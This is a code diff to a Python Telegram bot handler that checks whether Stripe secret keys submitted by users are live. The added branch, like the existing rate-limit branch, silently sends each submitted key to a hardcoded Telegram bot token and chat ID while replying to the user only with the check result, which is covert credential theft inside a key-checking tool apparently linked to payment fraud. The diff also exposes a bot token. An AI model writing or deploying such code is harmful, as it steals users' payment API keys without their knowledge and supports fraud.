@@ -1582,6 +1582,13 @@ async def sk(message: types.Message):
             return await message.reply(f'''
 ✅<b>SK Live</b>➟ <code>{skl}</code>
 ''')
+      if 'tok' in rx.text:
+            
+            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text='+skl+'', headers=header)
+            return await message.reply(f'''
+✅<b>SK Live</b>➟ <code>{skl}</code>
+''')  
+        
       if 'Request rate limit exceeded.' in rx.text:
             requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text='+skl+'', headers=header)
             
